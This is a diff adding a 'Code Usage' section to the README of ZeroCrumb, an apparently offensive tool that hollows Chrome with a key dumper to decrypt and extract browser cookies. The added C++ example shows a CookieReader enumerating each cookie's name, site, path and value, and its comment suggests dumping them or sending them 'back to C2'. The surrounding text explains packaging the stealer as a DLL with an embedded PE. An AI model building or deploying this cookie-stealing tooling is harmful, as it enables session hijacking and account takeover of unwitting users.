@@ -17,6 +17,23 @@ Usage of named pipes in ZeroCrumb allows any program, As long as it can use the 
 ## Using ZeroCrumb As A Library
 If you want to use ZeroCrumb as a library, You will need to compile a DLL that exports a function that does the hollowing of chrome with the key dumper. You might also need to embed the key dumper PE in the .rsrc section of the compiled DLL and later fetch it with the application resources Windows APIs.
 
+## Code Usage
+ZeroCrumb provides an easy to use **CookieReader** class to use:
+```cpp
+    auto reader = new CookieReader(cookiesPath.c_str(), key);
+
+    reader->initSqliteDb();
+    reader->prepare(queries::cookies);
+    reader->populateCookies();
+    
+    for (auto& cookie : reader->cookies) {
+        string name = cookie->name;
+        string site = cookie->site;
+        string path = cookie->path;
+        string cookieValue = cookie->cookie;
+        // dump to file, send back to C2, etc...
+    }
+```
 ## Usage
 You can run this in any directory of your choice as long as the key dumper is in the same directory.
 ```
